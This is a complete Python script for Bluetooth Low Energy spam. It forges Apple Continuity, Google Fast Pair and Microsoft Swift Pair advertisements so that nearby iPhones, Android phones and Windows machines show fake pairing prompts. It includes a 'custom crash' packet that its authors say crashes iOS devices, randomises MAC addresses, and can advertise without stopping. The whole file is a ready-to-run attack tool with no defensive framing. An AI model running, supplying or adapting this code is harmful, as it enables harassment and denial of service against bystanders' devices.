# Author: ECTO-1A & SAY-10
# Github: https://github.com/ECTO-1A

import argparse
import random
# Based on the previous work of chipik / _hexway
from dataclasses import dataclass
from enum import Enum, auto
from pprint import pprint
from time import sleep
from typing import Sequence

import bluetooth._bluetooth as bluez

from utils.bluetooth_utils import (change_internal_mac_addr,
                                   get_internal_mac_addr, start_le_advertising,
                                   stop_le_advertising, toggle_device)
from utils.fast_pair_models import all_fp_models
from utils.class_of_device import cod


# Add a docstring to describe the purpose of the script
help_desc = '''

Apple Proximity Pairing Notification Spoofing

---ECTO-1A August 2023---

Based on the previous work of chipik / _hexway
Ported from flipper firmware by https://github.com/barsikus007

'''


class PacketBuilder:
    packet: list[int] = []
    size = 0
    i = 0

    def __init__(self, size: int):
        if size > 31:
            raise ValueError(f"Name and type length sum is too long ({size} > 31)")
        self.packet = [0] * size
        self.size = size

    def override(self, count: int):
        self.i -= count

    def add(self, data):
        self.packet[self.i] = data
        self.i += 1

    def add_bytearray(self, data):
        for byte in data:
            self.add(byte)

    def add_random_bytearray(self, size: int):
        self.add_bytearray([random.randint(0, 255) for _ in range(size)])

    def add_random_mac(self):
        self.add_random_bytearray(6)

    def build(self):
        assert self.i == self.size == len(self.packet)
        return self.packet

    def print(self) -> str:
        return "(" + (', '.join([f"0x{c:02X}" for c in self.packet])) + ")"



class ContinuityType(Enum):
    AirDrop = 0x05
    ProximityPair = 0x07
    AirplayTarget = 0x09
    Handoff = 0x0C
    TetheringSource = 0x0E
    NearbyAction = 0x0F
    NearbyInfo = 0x10

    CustomCrash = auto()
    COUNT = auto()

HEADER_LEN = 6  # 1 Size + 1 AD Type + 2 Company ID + 1 Continuity Type + 1 Continuity Size

packet_sizes = {
    ContinuityType.AirDrop: HEADER_LEN + 18,
    ContinuityType.ProximityPair: HEADER_LEN + 25,
    ContinuityType.AirplayTarget: HEADER_LEN + 6,
    ContinuityType.Handoff: HEADER_LEN + 14,
    ContinuityType.TetheringSource: HEADER_LEN + 6,
    ContinuityType.NearbyAction: HEADER_LEN + 5,
    ContinuityType.NearbyInfo: HEADER_LEN + 5,
    ContinuityType.CustomCrash: HEADER_LEN + 11,
}

pp_models = {
    "AirPods": 0x0220,
    "AirPods Pro": 0x0E20,
    "AirPods Max": 0x0A20,
    "AirPods 2nd Gen": 0x0F20,
    "AirPods 3rd Gen": 0x1320,
    "AirPods Pro 2nd Gen": 0x1420,
    "PowerBeats 3": 0x0320,
    "PowerBeats Pro": 0x0B20,
    "Beats Solo Pro": 0x0C20,
    "Beats Studio Buds": 0x1120,
    "Beats Flex": 0x1020,
    "Beats X": 0x0520,
    "Beats Solo 3": 0x0620,
    "Beats Studio 3": 0x0920,
    "Beats Studio Pro": 0x1720,
    "Beats Fit Pro": 0x1220,
    "Beats Studio Buds+": 0x1620,

    "Airtag": 0x0055,
    "Hermes Airtag": 0x0030,
}

na_actions = {
    "AppleTV Setup": 0x01,
    "AppleTV Pair": 0x06,
    "AppleTV Keyboard": 0x13,
    "AppleTV Connecting...": 0x27,
    "AppleTV Join This AppleTV": 0x20,
    "AppleTV Wireless Audio Sync": 0x19,  # 0xc0
    "AppleTV Color Balance": 0x1E,
    "AppleTV AppleID Setup": 0x2B,
    "AppleTV HomeKit Setup": 0x0D,
    "HomePod Setup": 0x0B,
    "Setup New iPhone": 0x09,
    "Transfer Phone Number": 0x02,
}

# Define different bt_data options and their corresponding descriptions
bt_data_options = {
    1:  "AirPods",
    2:  "AirPods Pro",
    3:  "AirPods Max",
    4:  "AirPods 2nd Gen",
    5:  "AirPods 3rd Gen",
    6:  "AirPods Pro 2nd Gen",
    7:  "PowerBeats 3",
    8:  "PowerBeats Pro",
    9:  "Beats Solo Pro",
    10: "Beats Studio Buds",
    11: "Beats Flex",
    12: "Beats X",
    13: "Beats Solo 3",
    14: "Beats Studio 3",
    15: "Beats Studio Pro",
    16: "Beats Fit Pro",
    17: "Beats Studio Buds+",

    18: "AppleTV Setup",  # no picture
    19: "AppleTV Pair",  # no picture
    20: "AppleTV Join This AppleTV",
    21: "AppleTV AppleID Setup",
    22: "AppleTV Wireless Audio Sync",
    23: "AppleTV HomeKit Setup",
    24: "AppleTV Keyboard",
    25: "AppleTV Connecting...",
    26: "AppleTV Color Balance",
    27: "HomePod Setup",
    28: "Setup New iPhone",
    29: "Transfer Phone Number",

    # Add more options as needed (don't forget to review get_bt_data function below)
}

# Hex data map
hex_data = {
    1:  (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    2:  (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    3:  (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    4:  (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    5:  (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    6:  (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    7:  (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    8:  (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    9:  (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    10: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    11: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    12: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    13: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    14: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    15: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    16: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    17: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    18: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    19: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    20: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    21: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    22: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    23: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    24: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    25: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    26: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    27: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    28: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    29: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),

    # Add more as needed (don't forget to review get_bt_data function below)
}

def make_packet_apple(packet_type: ContinuityType, *, model: int = 0, action: int = 0) -> Sequence[int]:
    if model == 0:
        model = random.choice(list(pp_models.values()))
    if action == 0:
        action = random.choice(list(na_actions.values()))
    size = packet_sizes[packet_type]
    builder = PacketBuilder(size)

    builder.add(size - 1)  # Size
    builder.add(0xFF)  # AD Type (Manufacturer Specific)
    builder.add(0x4C)  # Company ID (Apple, Inc.)
    builder.add(0x00)  # ...
    builder.add(packet_type.value)  # Continuity Type
    builder.add(size - builder.i - 1)  # Continuity Size

    match packet_type:
        case ContinuityType.ProximityPair:
            builder.add(0x07)  # Prefix (paired 0x01 new 0x07 airtag 0x05)
            builder.add((model >> 0x08) & 0xFF)
            builder.add((model >> 0x00) & 0xFF)
            builder.add(0x55)  # Status  TODO why 0x55 not 0x75 ?
            builder.add(random.randint(0, 99))  # Buds Battery Level
            builder.add(random.randint(0, 79))  # Charging Status and Battery Case Level
            builder.add(random.randint(0, 255))  # Lid Open Counter
            builder.add(0x00)  # Device Color
            builder.add(0x00)
            builder.add_random_bytearray(16)
            return builder.build()
        case ContinuityType.NearbyAction:
            flags = 0xC0
            if action == 0x20 and random.randint(0, 1):
                flags -= 1  # More spam for 'Join This AppleTV?'
            if action == 0x09 and random.randint(0, 1):
                flags = 0x40  # Glitched 'Setup New Device'

            builder.add(flags)
            builder.add(action)
            builder.add_random_bytearray(3)  # Authentication Tag
            return builder.build()
        case ContinuityType.CustomCrash:
            # Found by @ECTO-1A

            action = random.choice(list(na_actions.values()))
            flags = 0xC0
            if action == 0x20 and random.randint(0, 1):
                flags -= 1  # More spam for 'Join This AppleTV?'
            if action == 0x09 and random.randint(0, 1):
                flags = 0x40  # Glitched 'Setup New Device'

            builder.override(2)  # Override segment header
            builder.add(ContinuityType.NearbyAction.value)  # Continuity Type
            builder.add(0x05)  # Continuity Size
            builder.add(flags)
            builder.add(action)
            builder.add_random_bytearray(3)  # Authentication Tag

            builder.add(0x00)  # Terminator (?)
            builder.add(0x00)  # ...

            builder.add(ContinuityType.NearbyInfo.value)  # Continuity Type (?)
            builder.add_random_bytearray(3)  # Continuity Size (?) + Shenanigans (???)
            return builder.build()
    raise NotImplementedError()


def make_packet_android(*, model: int = 0) -> Sequence[int]:
    if model == 0:
        model_name = random.choice(list(all_fp_models))
        model = all_fp_models[model_name]
        if isinstance(model, list):
            model = random.choice(model)
    size = 14
    builder = PacketBuilder(size)

    builder.add(3)  # Size
    builder.add(0x03)  # AD Type (Service UUID List)
    builder.add(0x2C)  # Service UUID (Google LLC, FastPair)
    builder.add(0xFE)  # ...

    builder.add(6)  # Size
    builder.add(0x16)  # AD Type (Service Data)
    builder.add(0x2C)  # Service UUID (Google LLC, FastPair)
    builder.add(0xFE)  # ...
    builder.add((model >> 0x10) & 0xFF)
    builder.add((model >> 0x08) & 0xFF)
    builder.add((model >> 0x00) & 0xFF)

    builder.add(2)  # Size
    builder.add(0x0A)  # AD Type (Tx Power Level)

    dbm = random.randint(-100, 19)
    if dbm < 0:
        dbm += 256
    builder.add(dbm) # -100 to +20 dBm
    return builder.build()


sp_names = [
    "Assquach💦",
    "Flipper 🐬",
    "iOS 17 🍎",
    "Kink💦",
    "👉👌",
    "🔵🦷",
]

class SwiftPairType(Enum):
    BLEOnly = 0x00
    BREDROnly = 0x01
    BLEAndBREDR = 0x02

def build_cod_services() -> str:
    output = format(random.randint(0, 2047), "#011b")  # 'cod_services'
    cod_device_class = cod["cod_device_class"]

    cod_major = random.choice(cod_device_class)
    # skip Miscellaneous and Uncategorized
    if cod_major["major"] in (0, 31):
        return build_cod_services()
    output += format(cod_major["major"], "05b")

    cod_minor = random.choice(cod_major.get("minor", cod_major.get("minor_bits", [])))
    minor_split = cod_major.get("subsplit", 6)
    if cod_major.get("minor_bits"):
        cod_minor_value = random.randint(0, minor_split)
    else:
        cod_minor_value = cod_minor["value"]
    output += format(cod_minor_value, f'0{minor_split}b')

    if cod_subminor := cod_minor.get("subminor"):
        output += format(random.choice(cod_subminor), f'0{6-minor_split}b')
    return f"{output}00"

def make_packet_windows(packet_type: SwiftPairType = SwiftPairType.BLEOnly, *, name: str = "") -> Sequence[int]:
    if not name:
        try:
            with open("names.txt", encoding="utf-8") as f:
                names = f.read().splitlines()
        except FileNotFoundError:
            names = sp_names
        name = random.choice(names)
    name_bytes = name.encode("utf-8")
    size = 7 + len(name_bytes)
    size += 3 if packet_type != SwiftPairType.BLEOnly else 0
    size += 6 if packet_type == SwiftPairType.BREDROnly else 0
    builder = PacketBuilder(size)

    builder.add(size -1)  # Size
    builder.add(0xFF)  # AD Type (Manufacturer Specific)
    builder.add(0x06)  # Company ID (Microsoft)
    builder.add(0x00)  # ...
    builder.add(0x03)  # Microsoft Beacon ID
    builder.add(packet_type.value)  # Microsoft Beacon Sub Scenario
    builder.add(0x80)  # Reserved RSSI Byte

    if packet_type == SwiftPairType.BREDROnly:
        builder.add_random_mac()  # BREDR MAC Address

    if packet_type != SwiftPairType.BLEOnly:
        builder.add_bytearray(int(build_cod_services(), 2).to_bytes(3, "big"))

    builder.add_bytearray(name_bytes)  # Add name bytes
    return builder.build()


def make_apple_data(option: int) -> Sequence[int]:
    bt_data = hex_data.get(option)

    if not bt_data:
        raise ValueError(f"Invalid data option: {option}")
    name = bt_data_options[option]
    if "AirPods" not in name and "Beats" not in name:
        return bt_data  # make_packet_apple(ContinuityType.NearbyAction, model=na_actions[name])

    return make_packet_apple(ContinuityType.ProximityPair, model=pp_models[name])


class SpamTarget(Enum):
    random = auto()  # All except CustomCrash and Windows (WIP)
    IOS = auto()
    Android = auto()
    Windows = auto()
    IOSCustomCrash = auto()


@dataclass
class AttackPattern():
    dev_id: int
    interval: int
    adv_time: float
    random_mac: bool
    random_adv: bool
    spam_data: list
    spam_target: SpamTarget
    permanent: bool


def start_spam(sock, *, pattern: AttackPattern) -> None:
    spam_data = random.choice(pattern.spam_data) if pattern.spam_data else ""
    match pattern.spam_target:
        case SpamTarget.random:
            while True:
                pattern.spam_target = random.choice(
                    [
                        SpamTarget.IOS,
                        SpamTarget.Android,
                        SpamTarget.Windows,
                    ]
                )
                start_spam(sock, pattern=pattern)
        case SpamTarget.IOS:
            if spam_data:
                if spam_data.isalnum():
                    selected_option = int(spam_data)
                    if not 1 <= selected_option <= len(bt_data_options):
                        message = (
                            "Invalid data option: {selected_option}"
                            + "\nAvailable data options:"
                        )
                        for option, description in bt_data_options.items():
                            message += f"\n{option}: {description}"
                        raise ValueError(message)
                else:
                    try:
                        selected_option = list(bt_data_options.keys())[
                            [
                                _.lower() for _ in bt_data_options.values()
                            ].index(spam_data.lower())
                        ]
                    except ValueError as e:
                        message = (
                            f"Invalid device name: {spam_data}"
                            + "\nAvailable device names:"
                        )
                        for device_name in bt_data_options.values():
                            message += f"\n{device_name}"
                        raise ValueError(message) from e
            else:
                selected_option = random.choice(list(bt_data_options.keys()))
            bt_data = make_apple_data(selected_option)
        case SpamTarget.Android:
            bt_data = make_packet_android(model=(int(spam_data, 16) if spam_data.isalnum() else 0))
        case SpamTarget.Windows:
            bt_data = make_packet_windows(SwiftPairType.BLEAndBREDR, name=spam_data)
        case SpamTarget.IOSCustomCrash:
            bt_data = make_packet_apple(ContinuityType.CustomCrash)
        case _:
            return

    if pattern.random_mac:
        random_mac = ":".join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)])

        # TODO check if specific mac matter
        # if pattern.spam_target in [SpamTarget.Android, SpamTarget.Windows]:
        #     random_mac = f"d4:3a:2c:{random_mac[9:]}"  # google mac prefix

        change_internal_mac_addr(sock, random_mac)

    ADV_IND = 0x00
    ADV_DIRECT_IND = 0x01
    ADV_SCAN_IND = 0x02
    ADV_NONCONN_IND = 0x03
    ADV_SCAN_RSP = 0x04
    if pattern.random_adv:
        # TODO test on apple
        # adv_type = random.choice([ADV_SCAN_RSP, ADV_IND, ADV_SCAN_IND, ADV_NONCONN_IND])
        adv_type = random.choice([ADV_IND, ADV_SCAN_IND, ADV_NONCONN_IND])
    else:
        adv_type = ADV_NONCONN_IND

    start_le_advertising(sock, adv_type=adv_type, min_interval=pattern.interval, max_interval=pattern.interval, data=bt_data)
    while True:
        sleep(pattern.adv_time)
        if not pattern.permanent:
            break
    stop_le_advertising(sock)


def main():
    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-i', '--interval', default=20, type=int, help='Advertising interval, ms (default 20))')
    parser.add_argument('-t', '--adv-time', default=1.0, type=float, help='Advertising time, s (default 1.0))')
    parser.add_argument('-b', '--bt-dev-id', default=0, type=int, help='Bluetooth device ID (default 0)')
    parser.add_argument('-d', '--data', type=str,
                        help='Select a message or device name to send (e.g., \'-d 1\' or \'-d "AirPods Pro"\') (can be splitted by , for multiple)')

    # Behavior
    parser.add_argument('-r', '--random', action='store_true', help='Randomly loop through advertising data (default) (also, forces random mac (random adv is WIP)))')
    parser.add_argument('--repeat', action='store_true', help='Infinitely repeat specified advertising data, without re-enabling')

    # Targets
    parser.add_argument('-c', '--custom-crash', action='store_true', help='Use custom crash method by @ECTO-1A')
    parser.add_argument('-ap', '--apple', action='store_true', help='Apple BLE spam')
    parser.add_argument('-an', '--android', action='store_true', help='Android BLE spam')
    parser.add_argument('-w', '--windows', action='store_true', help='Windows BLE spam (-t lower than 0.5 is recommended)')

    # Randomization
    parser.add_argument('--random-mac', action='store_true', help='Randomly select mac address')
    parser.add_argument('--random-adv', action='store_true', help='Randomly select advertisement event types')

    args = parser.parse_args()

    spam_target = (
        SpamTarget.IOS if args.apple else
        SpamTarget.Android if args.android else
        SpamTarget.Windows if args.windows else
        SpamTarget.IOSCustomCrash if args.custom_crash else
        SpamTarget.random)
    attack_pattern = AttackPattern(
        dev_id=args.bt_dev_id,
        interval=args.interval,
        adv_time=args.adv_time,
        random_mac=spam_target is SpamTarget.random or args.random_mac,
        random_adv=args.random_adv,
        spam_data=args.data.split(",") if args.data else [],
        spam_target=spam_target,
        permanent=args.repeat,
    )
    print()
    pprint(attack_pattern)
    print()

    # the default Bluetooth device is hci0
    toggle_device(attack_pattern.dev_id, True)

    try:
        sock = bluez.hci_open_dev(attack_pattern.dev_id)
        if spam_target is SpamTarget.random or args.random_mac:
            original_mac = get_internal_mac_addr(attack_pattern.dev_id)
            print(f"Your original mac address is {original_mac}\nIt will restored after you stop the script\n")
    except Exception as e:
        print(f"Unable to connect to Bluetooth hardware {attack_pattern.dev_id}: {e}")
        return

    print("Advertising Started... Press Ctrl+C to Stop")

    try:
        while True:
            start_spam(sock, pattern=attack_pattern)
    except KeyboardInterrupt:
        stop_le_advertising(sock)
    except Exception as e:
        print(f"An error occurred ({type(e)}): {e}")
        stop_le_advertising(sock)
    if spam_target is SpamTarget.random or args.random_mac:
        print(f"Restoring original mac address {original_mac}...")  # type: ignore
        change_internal_mac_addr(sock, original_mac)  # type: ignore

if __name__ == "__main__":
    main()
